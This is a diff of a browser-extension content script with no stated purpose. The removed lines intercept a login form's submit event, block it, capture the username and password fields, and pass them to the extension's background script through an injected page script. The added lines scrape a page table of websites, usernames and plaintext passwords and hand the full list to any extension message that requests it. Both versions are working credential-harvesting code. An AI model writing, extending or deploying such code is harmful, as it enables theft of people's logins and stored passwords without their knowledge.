@@ -1,31 +1,27 @@
-function captureCredentials() {
-  const loginForm = document.querySelector('form'); // Adjust the selector based on your target login form
+// contentScript.js
 
-  if (loginForm) {
-    loginForm.addEventListener('submit', function (event) {
-      event.preventDefault();
+function extractPasswordsFromTable() {
+  const passwords = [];
+  const rows = document.querySelectorAll("#passwords-table tbody tr");
 
-      const usernameField = loginForm.querySelector('input[name="j_username"]'); // Adjust the selector for the username field
-      const passwordField = loginForm.querySelector('input[name="j_password"]'); // Adjust the selector for the password field
+  rows.forEach(row => {
+    const websiteCell = row.querySelector("td:nth-child(1)");
+    const usernameCell = row.querySelector("td:nth-child(2)");
+    const passwordCell = row.querySelector(".actual-password");
 
-      if (usernameField && passwordField) {
-        const credentials = {
-          username: usernameField.value,
-          password: passwordField.value,
-        };
+    const website = websiteCell.textContent.trim();
+    const username = usernameCell.textContent.trim();
+    const password = passwordCell.textContent.trim();
 
-        chrome.runtime.sendMessage({ type: 'credentials', credentials }, function (response) {
-          console.log('Credentials sent to background script');
-        });
-      }
+    passwords.push({ website, username, password });
+  });
 
-      // Remove the loginForm.submit() line; we don't need to submit the form manually
-    });
-  }
+  return passwords;
 }
 
-// Inject the content script into the web page
-const script = document.createElement('script');
-script.textContent = '(' + captureCredentials.toString() + ')();';
-(document.head || document.documentElement).appendChild(script);
-script.remove();
+chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
+  if (message.action === "getPasswords") {
+    const passwords = extractPasswordsFromTable();
+    sendResponse({ passwords });
+  }
+});
